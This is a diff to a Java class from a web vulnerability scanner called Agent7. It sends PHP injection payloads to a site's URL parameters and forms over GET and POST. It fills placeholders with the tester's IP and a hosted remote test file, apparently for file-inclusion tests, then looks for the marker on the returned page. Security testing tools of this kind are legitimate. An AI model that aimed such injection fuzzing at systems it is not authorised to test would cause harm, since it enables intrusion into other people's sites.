@@ -2,24 +2,32 @@ package me.dylan.Agent7.http.Fuzzer;
 
 import java.io.IOException;
 import java.net.Inet4Address;
+import java.net.URISyntaxException;
 import java.net.UnknownHostException;
 import java.util.ArrayList;
 
 import me.dylan.Agent7.Agent7;
+import me.dylan.Agent7.res.ContentLoader;
 
 import org.jsoup.Connection;
 import org.jsoup.Jsoup;
 import org.jsoup.Connection.Method;
 import org.jsoup.nodes.Element;
 import org.jsoup.select.Elements;
+
 /**
- * Not yet implemented, but should function properly.
+ * Deprecated, as PHP has implemented a fix for most PHP injection attacks
+ * in the latest version.
+ * 
  * @author Dylan
- *
+ * 
  */
+@Deprecated
 public class FuzzerPhp extends Fuzzer {
 
 	public FuzzerPhp(String url) {
+		if (!url.startsWith("htt"))
+			url = "http://" + url;
 		this.url = url;
 		try {
 			payloads = PayloadUtil.getInjectionPayloads("PHPTests.txt");
@@ -36,25 +44,22 @@ public class FuzzerPhp extends Fuzzer {
 		connectionMethod = "GET";
 		Agent7.logLine("Testing popular url extensions(GET).");
 		executeTestConnection(params);
-		
+
 		connectionMethod = "POST";
 		Agent7.logLine("Testing popular url extensions(POST).");
 		executeTestConnection(params);
 		params.clear();
-	/*	Elements linkElements = doc.getElementsByTag("a");
-		for (Element inputEl : linkElements) {
-			if (!inputEl.text().contains(url))
-				continue;
-			url = inputEl.attr("abs:href");
-			connectionMethod = "GET";
-			params.add(inputEl.text());
-		}*/
+		/*
+		 * Elements linkElements = doc.getElementsByTag("a"); for (Element
+		 * inputEl : linkElements) { if (!inputEl.text().contains(url))
+		 * continue; url = inputEl.attr("abs:href"); connectionMethod = "GET";
+		 * params.add(inputEl.text()); }
+		 */
 		executeTestConnection(params);
 	}
 
 	public void beginInjectionForms() {
-		
-		
+
 		for (Element e : forms) {
 			url = e.attr("abs:action");
 			connectionMethod = e.attr("method");
@@ -97,10 +102,26 @@ public class FuzzerPhp extends Fuzzer {
 
 	@Override
 	public void executeTestConnection(ArrayList<String> params) {
+		int queriesAttempted = 0;
 		for (String name : params) {
 			for (String payload : payloads) {
+				int index = payloads.indexOf(payload);
+				queriesAttempted++;
+				double progress = ((double) (queriesAttempted) / (double) ((payloads
+						.size() * params.size()))) * 100;
+				Agent7.setProgress((int) Math.ceil(progress));
+
 				try {
-					int index = payloads.indexOf(payload);
+					payload = payload.replace("#ip", Inet4Address.getLocalHost()
+							.getHostAddress());
+				} catch (UnknownHostException e1) {
+					e1.printStackTrace();
+				}
+				payload = payload.replace("#payload", "vulnerablePage" + index
+						+ "#" + name);
+				payload = payload.replace("#testfile",
+						"http://www.mediafire.com/?3akbzhyfo9827nr");
+				try {
 					Connection connection = Jsoup.connect(url);
 					sendGetPostPayloads(connection, payload);
 					verifyPayloadExecution(index, name);
@@ -114,7 +135,11 @@ public class FuzzerPhp extends Fuzzer {
 
 	public void verifyPayloadExecution(int index, String name)
 			throws UnknownHostException {
-		if (doc.html().contains(Inet4Address.getLocalHost().getHostAddress()))
+		Element e = doc.getElementById("vulnerablePage" + index + "#" + name);
+		if (e != null
+				&& !e.parents().html().contains("noscript")
+				&& e.data().contains(
+						Inet4Address.getLocalHost().getHostAddress()))
 			Agent7.logLine("Found vunerability using payload: "
 					+ payloads.get(index) + " On form: " + name);
 	}
